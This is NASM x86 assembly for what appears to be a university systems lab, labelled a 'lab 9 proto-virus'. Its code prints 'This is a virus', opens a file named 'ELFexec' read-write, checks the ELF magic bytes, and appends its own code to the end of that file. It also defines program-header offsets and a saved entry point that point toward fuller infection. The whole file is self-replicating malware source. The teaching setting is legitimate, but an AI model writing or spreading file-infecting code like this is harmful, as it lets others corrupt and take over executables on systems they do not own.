%macro	syscall1 2
	mov	ebx, %2
	mov	eax, %1
	int	0x80
%endmacro

%macro	syscall3 4
	mov	edx, %4
	mov	ecx, %3
	mov	ebx, %2
	mov	eax, %1
	int	0x80
%endmacro

%macro  exit 1
	syscall1 1, %1
%endmacro

%macro  write 3
	syscall3 4, %1, %2, %3
%endmacro

%macro  read 3
	syscall3 3, %1, %2, %3
%endmacro

%macro  open 3
	syscall3 5, %1, %2, %3
%endmacro

%macro  lseek 3
	syscall3 19, %1, %2, %3
%endmacro

%macro  close 1
	syscall1 6, %1
%endmacro

%define	STK_RES	200
%define	RDWR	2
%define	SEEK_END 2
%define SEEK_SET 0

%define ENTRY		24
%define PHDR_start	28
%define	PHDR_size	32
%define PHDR_memsize	20	
%define PHDR_filesize	16
%define	PHDR_offset	4
%define	PHDR_vaddr	8

%define FD_OFFSET [ebp-4]
%define LEN_OFFSET[ebp-12]

	global _start

	section .text
_start:	
	push	ebp
	mov	ebp, esp
	sub	esp, STK_RES            ; Set up ebp and reserve space on the stack for local storage

; You code for this lab goes here
; task 0b:
; Print:
	call get_my_loc
	add ecx, infected_msg - next_i
	write 1, ecx, 16

; open file, file descriptor returns to eax		
	call get_my_loc
	add ecx, FileName - next_i
	mov ebx, ecx
	; mov ecx, 0
	open ebx, RDWR, 07777
	cmp eax, 0
	jl errorExit
	mov FD_OFFSET, eax				; save fd

	lea ebx, [ebp-8] ; magic number
	read FD_OFFSET, ebx, 4

; Check Magic number
    cmp byte [ebp-8], 0x7f
    jne errorExit
    cmp byte [ebp-7], 'E'
    jne errorExit
    cmp byte [ebp-6], 'L'
    jne errorExit
    cmp byte [ebp-5], 'F'
    jne errorExit
	
; Find the file length
	lseek FD_OFFSET, 0, SEEK_END
; infect file
	mov edx, virus_end
	sub edx, _start
	write FD_OFFSET, _start, edx

	close FD_OFFSET
	jmp VirusExit

get_my_loc:
	call next_i
next_i:
	pop ecx
	ret

errorExit:
	exit 1
VirusExit:
    exit 0            	; Termination if all is OK and no previous code to jump to
                        ; (also an example for use of above macros)
	
FileName:	db "ELFexec", 0
OutStr:		db "The lab 9 proto-virus strikes!", 10, 0
Failstr:        db "perhaps not", 10 , 0
infected_msg: db "This is a virus", 10, 0
	
PreviousEntryPoint: dd VirusExit
virus_end:
